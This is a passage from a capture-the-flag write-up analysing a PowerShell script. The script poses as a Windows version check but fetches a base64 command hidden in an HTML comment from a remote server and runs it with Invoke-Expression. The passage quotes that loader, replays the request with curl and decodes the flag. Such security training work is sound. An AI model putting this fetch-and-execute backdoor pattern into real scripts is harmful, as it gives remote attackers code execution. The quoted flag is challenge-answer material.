# Windows Version and Build #
#
$WindowsInfo = Get-Item "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion"
# $PORT below is dynamic to the running service of the `Start` button
$OS = @($html = (Invoke-WebRequest http://chal.ctf.games:$PORT -Headers @{Authorization=("Basic YmFja2Rvb3I6dXNlX3RoaXNfdG9fYXV0aGVudGljYXRlX3dpdGhfdGhlX2RlcGxveWVkX2h0dHBfc2VydmVyCg==")} -UseBasicParsing).Content
if ($html -match '<!--(.*?)-->') {
    $value = $matches[1]
    $command = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($value))
    Invoke-Expression $command
})

# (snip)
```

Sending request with the above token.

```console
root@kali:~/ctf/HuntressCTF# curl -D- http://chal.ctf.games:31971 -H "Authorization: Basic YmFja2Rvb3I6dXNlX3RoaXNfdG9fYXV0aGVudGljYXRlX3dpdGhfdGhlX2RlcGxveWVkX2h0dHBfc2VydmVyCg=="
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 69

<!-- ZWNobyBmbGFnezYwYmIzYmZhZjcwM2UwZmEzNjczMGFiNzBlMTE1YmQ3fQ== -->

root@kali:~/ctf/HuntressCTF# echo -ne 'ZWNobyBmbGFnezYwYmIzYmZhZjcwM2UwZmEzNjczMGFiNzBlMTE1YmQ3fQ==' | base64 -d
echo flag{60bb3bfaf703e0fa36730ab70e115bd7}
```
